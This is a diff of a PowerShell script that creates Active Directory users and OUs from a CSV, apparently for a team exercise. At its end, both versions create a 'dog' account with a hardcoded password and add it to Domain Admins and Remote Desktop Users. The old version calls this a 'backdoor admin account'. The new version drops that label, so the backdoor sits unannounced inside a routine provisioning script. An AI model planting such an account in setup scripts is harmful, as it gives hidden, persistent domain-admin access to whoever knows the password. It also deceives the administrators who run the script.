@@ -1,12 +1,17 @@
 # Adds users to the Domain and adds them to listed Groups
 # Necessary Files: NewEmployees.csv
-# Designed for Windows Server 2016
+# Designed for Windows Server 2016 
 # GDDC Sp26 - Domain User Setup Script
+
+
 
 Import-Module ActiveDirectory
 
+$Users = Import-Csv -Delimiter "," -Path "C:\Users\Public\NewEmployees.csv" # Change to wherever the NewEmployee.csv file lives
+$TeamDomain = "DOGTeam#.local" 
+
 # --- Configuration ---
-$DomainName = "DOGteam1.local"   # Change this to match your domain
+$DomainName = "DOGTeam#.local"   # Change this to match your domain
 $DomainDN   = "DC=" + ($DomainName -replace "\.", ",DC=")  # Builds "DC=DOGteam#,DC=local"
 # ---------------------
 
@@ -38,66 +43,56 @@ foreach ($OUName in $PredefinedOUs) {
     }
 }
 
-# ---------------------------------------------------------------------------------
 
-$Users = Import-Csv -Delimiter "," -Path "C:\Users\Public\Storage\Employees.csv"
-
-# Extract unique OUs from the CSV and create any that weren't in the predefined list
+# Extract unique OUs from the CSV and create them if they don't exist
 $UniqueContainers = $Users.Container | Select-Object -Unique
 
-Write-Host "`nCreating any additional OUs from CSV..." -ForegroundColor Cyan
-
 foreach ($Container in $UniqueContainers) {
-    # Replace whatever DC= domain is in the CSV with the correct domain
-    $OU_DN = ($Container.Trim() -replace ",\s+", ",") -replace "DC=.+$", $DomainDN
-
-    if ($OU_DN -match '^OU=(?<Name>[^,]+),(?<Path>.+)$') {
-        $OUName = $Matches['Name']
-        $OUPath = $Matches['Path']
-
-        $exists = Get-ADOrganizationalUnit -Filter { DistinguishedName -eq $OU_DN } -ErrorAction SilentlyContinue
-
-        if ($exists) {
-            Write-Host "OU already exists: $OUName" -ForegroundColor Yellow
-        } else {
+    # Clean up the container string just like in the user loop
+    $OU_DN = $Container.Trim() -replace ",\s+", ","
+    
+    try {
+        # Check if the OU already exists
+        Get-ADOrganizationalUnit -Identity $OU_DN -ErrorAction Stop | Out-Null
+    } catch {
+        # If it fails, the OU doesn't exist. Parse the DN to get the Name and Path.
+        if ($OU_DN -match '^OU=(?<Name>[^,]+),(?<Path>.+)$') {
+            $OUName = $Matches['Name']
+            $OUPath = $Matches['Path']
+            
             try {
-                New-ADOrganizationalUnit -Name $OUName -Path $OUPath -ProtectedFromAccidentalDeletion $false
-                Write-Host "Created OU: $OUName" -ForegroundColor Cyan
+                New-ADOrganizationalUnit -Name $OUName -Path $OUPath
+                Write-Host "Created OU: $OUName in $OUPath" -ForegroundColor Cyan
             } catch {
                 Write-Warning "Failed to create OU '$OUName': $_"
             }
+        } else {
+            Write-Warning "Could not parse OU Name and Path from format: $OU_DN"
         }
-    } else {
-        Write-Warning "Could not parse OU from: $OU_DN"
     }
 }
 
-Write-Host "`nAll OUs processed. Creating users..." -ForegroundColor Cyan
-
 # ---------------------------------------------------------------------------------
-# Parses the CSV and creates AD users
 
+# Parses the csv file for user information and formats it for Active Directory
 foreach ($User in $Users) {
     $SAM         = $User.Username
     $Displayname = $User.Displayname
     $Firstname   = $User.Firstname
     $Lastname    = $User.Lastname
-    # Replace whatever DC= domain is in the CSV with the correct domain
-    $OU          = ($User.Container.Trim() -replace ",\s+", ",") -replace "DC=.+$", $DomainDN
-    $UPN         = $User.Username + "@$DomainName"
+    $OU          = $User.Container.Trim() -replace ",\s+", ","   # <-- strips extra spaces
+    $UPN         = $User.Username + $TeamDomain
     $Password    = ConvertTo-SecureString $User.Password -AsPlainText -Force
 
-    $ouCheck = Get-ADOrganizationalUnit -Filter { DistinguishedName -eq $OU } -ErrorAction SilentlyContinue
-    if (-not $ouCheck) {
-        Write-Warning "OU not found: '$OU' -- skipping user $SAM"
+    # Verify the OU exists before trying to create the user
+    try {
+        Get-ADOrganizationalUnit -Identity $OU -ErrorAction Stop | Out-Null
+    } catch {
+        Write-Warning "OU not found: '$OU' — skipping user $SAM"
         continue
     }
 
-    if (Get-ADUser -Filter { SamAccountName -eq $SAM } -ErrorAction SilentlyContinue) {
-        Write-Host "User already exists: $SAM" -ForegroundColor Yellow
-        continue
-    }
-
+    # Creates the user with the collected information
     try {
         New-ADUser `
             -Name                  $Displayname `
@@ -111,35 +106,38 @@ foreach ($User in $Users) {
             -Path                  $OU `
             -ChangePasswordAtLogon $false `
             -PasswordNeverExpires  $true
+
         Write-Host "Created user: $SAM" -ForegroundColor Green
-    } catch {
+    } catch {  
         Write-Warning "Failed to create user $SAM`: $_"
     }
 }
 
-# ---------------------------------------------------------------------------------
-# Create backdoor admin account
+Import-Module ActiveDirectory
 
+# Define new user parameters
 $newUsername = "dog"
 $password = "bb123#123#123" | ConvertTo-SecureString -AsPlainText -Force
 
-if (-not (Get-ADUser -Filter { SamAccountName -eq $newUsername } -ErrorAction SilentlyContinue)) {
-    $userProperties = @{
-        SamAccountName        = $newUsername
-        UserPrincipalName     = "$newUsername@$DomainName"
-        Name                  = $newUsername
-        GivenName             = "dog"
-        Surname               = "woof"
-        Enabled               = $true
-        DisplayName           = "dog woof"
-        AccountPassword       = $password
-        ChangePasswordAtLogon = $false
-    }
-
-    New-ADUser @userProperties
-    Add-ADGroupMember -Identity "Domain Admins" -Members $newUsername
-    Add-ADGroupMember -Identity "Remote Desktop Users" -Members $newUsername
-    Write-Host "User $newUsername created and added to Domain Admins." -ForegroundColor Green
-} else {
-    Write-Host "User $newUsername already exists, skipping." -ForegroundColor Yellow
+$userProperties = @{
+    SamAccountName = $newUsername
+    UserPrincipalName = "$newUsername@yourdomain.com"
+    Name = $newUsername
+    GivenName = "dog"
+    Surname = "woof"
+    Enabled = $true
+    DisplayName = "dog woof"
+    AccountPassword = $password
+    ChangePasswordAtLogon = $false
 }
+
+# Create the new user
+New-ADUser @userProperties
+
+# Add the user to the Domain Admins group
+Add-ADGroupMember -Identity "Domain Admins" -Members $newUsername
+Add-ADGroupMember -Identity "Remote Desktop Users" -Members $newUsername
+
+Write-Host "User $newUsername created and added to Domain Admins."   
+
+# Jon Fortnite
